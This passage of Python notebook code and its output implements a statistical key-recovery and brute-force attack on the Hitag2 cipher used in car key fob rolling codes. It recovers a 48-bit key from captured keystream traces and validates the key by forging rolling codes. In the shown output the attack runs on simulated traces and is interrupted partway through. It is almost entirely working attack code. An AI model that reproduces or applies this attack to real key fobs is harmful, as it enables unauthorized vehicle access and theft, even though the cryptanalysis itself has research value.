    # Pre-compute tables for this n_ext
    t_tbl = time.time()
    max_t = min(N_KS_INITIAL + n_ext, 32)
    for t in range(max_t):
        get_table(t, n_ext)
    tbl_time = time.time() - t_tbl

    print(f"\n  Round {ext_round}: key[{31-ext_round}], {n_cand} cand (tbl: {tbl_time:.1f}s)...")

    # Double (split candidates)
    new_guess16 = np.repeat(cand_guess16, 2)
    new_key_ext = np.repeat(cand_key_ext, 2)
    new_key_ext |= (np.tile(np.array([0, 1], dtype=np.uint32), n_cand) << ext_round)
    new_n = len(new_guess16)

    # FULL score recomputation for each candidate
    new_log_scores = np.zeros(new_n, dtype=np.float64)

    for tr in traces:
        nonce = tr['iv']
        ks = tr['ks']

        # Compute mixing bits
        mixing_arrays = np.zeros((new_n, n_ext), dtype=np.uint8)
        for ci in range(new_n):
            g16 = int(new_guess16[ci])
            kext = int(new_key_ext[ci])
            state = 0
            for j in range(16):
                state |= (((g16 >> (15 - j)) & 1) << (32 + j))
            state |= uid_state
            for i in range(n_ext):
                nb = (nonce >> (31 - i)) & 1
                kb = (kext >> i) & 1
                mb = f20(state) ^ nb ^ kb
                mixing_arrays[ci, i] = mb
                state = (state >> 1) | (mb << 47)

        # Full score: product over all testable t values
        tr_log = np.zeros(new_n, dtype=np.float64)
        for t in range(max_t):
            tbl = get_table(t, n_ext)
            if tbl is None: break
            n_g = tbl['n_guess']
            n_m = tbl['n_mixing']
            if n_g + n_m == 0: break

            table_idx = np.zeros(new_n, dtype=np.uint32)
            for bp in range(n_g):
                p = tbl['guess_pos'][bp]
                shift = 15 - p - t
                table_idx |= (((new_guess16 >> shift) & 1).astype(np.uint32) << bp)
            for bp_off in range(n_m):
                mix_idx = tbl['mixing_offsets'][bp_off]
                table_idx |= (mixing_arrays[:, mix_idx].astype(np.uint32) << (n_g + bp_off))

            ks_bit = (ks >> (31 - t)) & 1
            scores = tbl['scores_1' if ks_bit else 'scores_0'][table_idx]
            tr_log += np.log(np.clip(scores, 1e-10, None))

        # Sum WITH SIGN (not abs per trace!)
        new_log_scores += tr_log

    # Mean across traces
    new_log_scores /= len(traces)

    # Prune by |log_score| descending
    if new_n > TABLE_SIZE:
        top_idx = np.argsort(-np.abs(new_log_scores))[:TABLE_SIZE]
        cand_guess16 = new_guess16[top_idx]
        cand_key_ext = new_key_ext[top_idx]
        pruned = True
    else:
        cand_guess16 = new_guess16
        cand_key_ext = new_key_ext
        pruned = False

    # Verify
    true_kext_partial = true_key_ext_full & ((1 << n_ext) - 1)
    match_mask = (cand_guess16 == true_guess) & (cand_key_ext == true_kext_partial)
    found_indices = np.where(match_mask)[0]

    elapsed_round = time.time() - t_round
    status = f"rank {found_indices[0]+1}" if len(found_indices) > 0 else "ELIMINATED"
    prune_str = f", pruned to {TABLE_SIZE}" if pruned else ", no pruning"
    print(f"    {status} ({elapsed_round:.1f}s{prune_str})")

elapsed_step5 = time.time() - t_step5
print(f"\n  Step 5 totale: {elapsed_step5:.1f}s")

# =============================================================================
# BRUTE FORCE
# =============================================================================

n_missing = 32 - N_EXT_ROUNDS
print(f"\n{'='*60}")
print(f"BRUTE FORCE: {n_missing} bit (2^{n_missing} = {1<<n_missing:,})")
print(f"{'='*60}")

N_TOP = min(50, len(cand_guess16))
t_final = time.time()
recovered_key = None

for cr in range(N_TOP):
    t_c = time.time()
    g16 = int(cand_guess16[cr])
    kext = int(cand_key_ext[cr])

    key_mid_mask = 0
    key_mid_vals = 0
    for i in range(N_EXT_ROUNDS):
        bpos = (31 - i) - 16
        if bpos >= 0:
            key_mid_mask |= (1 << bpos)
            key_mid_vals |= (((kext >> i) & 1) << bpos)

    unk_mid_pos = [b for b in range(16) if not (key_mid_mask >> b) & 1]
    n_unk_mid = len(unk_mid_pos)

    for missing in range(1 << n_missing):
        if missing % 200000 == 0 and missing > 0:
            print(f"    #{cr+1}: {missing:,}/{1<<n_missing:,}...", end='\r')

        key_mid = key_mid_vals
        for bp, mp in enumerate(unk_mid_pos):
            key_mid |= (((missing >> bp) & 1) << mp)
        key_low = (missing >> n_unk_mid) & 0xFFFF

        kc = (g16 << 32) | (key_mid << 16) | key_low

        st = hitag2_init(kc, UID, traces[0]['ctr'], traces[0]['btn'])
        if hitag2_keystream(st, 32) != traces[0]['ks']:
            continue

        ok = True
        for tr in traces[1:]:
            st = hitag2_init(kc, UID, tr['ctr'], tr['btn'])
            if hitag2_keystream(st, 32) != tr['ks']:
                ok = False
                break
        if ok:
            recovered_key = kc
            print(f"\n  FOUND at candidate #{cr+1}!")
            break

    if recovered_key:
        break
    print(f"  #{cr+1}: no match ({time.time()-t_c:.1f}s)")

elapsed_final = time.time() - t_final

# =============================================================================
# RESULT
# =============================================================================

print(f"\n{'='*60}")
print("RESULT")
print(f"{'='*60}")

total = time.time() - t0_global

if recovered_key:
    print(f"  Recovered: 0x{recovered_key:012X}")
    print(f"  True:       0x{KEY:012X}")
    print(f"  {'✓ ATTACK SUCCESSFUL!' if recovered_key == KEY else '✗ Different'}")
    print(f"\n  Step 1-4:    {time.time()-t_step14:.1f}s")
    print(f"  Step 5:      {elapsed_step5:.1f}s")
    print(f"  Brute force: {elapsed_final:.1f}s")
    print(f"  Total:      {total:.1f}s")

    print(f"\n  Validation:")
    for i in range(4):
        c = CTR + 100 + i
        o = generate_rolling_code(KEY, UID, c, BTN)['ks']
        r = generate_rolling_code(recovered_key, UID, c, BTN)['ks']
        print(f"    ctr={c}: {'✓' if o == r else '✗'}")
else:
    print(f"  ✗ Not found. Time: {total:.1f}s")

print("\n[END BLOCK 3]")

Generating 8 non-consecutive traces...
  [trace 0] ctr=563  ks=0x5D3E7EDB
  [trace 1] ctr=570  ks=0x7C0EDC1C
  [trace 2] ctr=577  ks=0x7D075667
  [trace 3] ctr=584  ks=0x740D1873
  [trace 4] ctr=591  ks=0x750F4FCE
  [trace 5] ctr=598  ks=0x7F28E90B
  [trace 6] ctr=605  ks=0x74291EA1
  [trace 7] ctr=612  ks=0x712F95AF

KEY = 0x1C80A3B1799D, correct guess = 0x1C80

F20_TABLE...
  8.9s
Step 1-4 tables...
  35.7s

STEP 1-4
  0.3s, correct guess rank 28615/65536

STEP 5: 16 rounds (full recomputation)

  Round 0: key[31], 65536 cand (tbl: 38.2s)...
    rank 57230 (49.7s, no pruning)

  Round 1: key[30], 131072 cand (tbl: 40.6s)...
    rank 40413 (72.6s, pruned to 131072)



KeyboardInterrupt

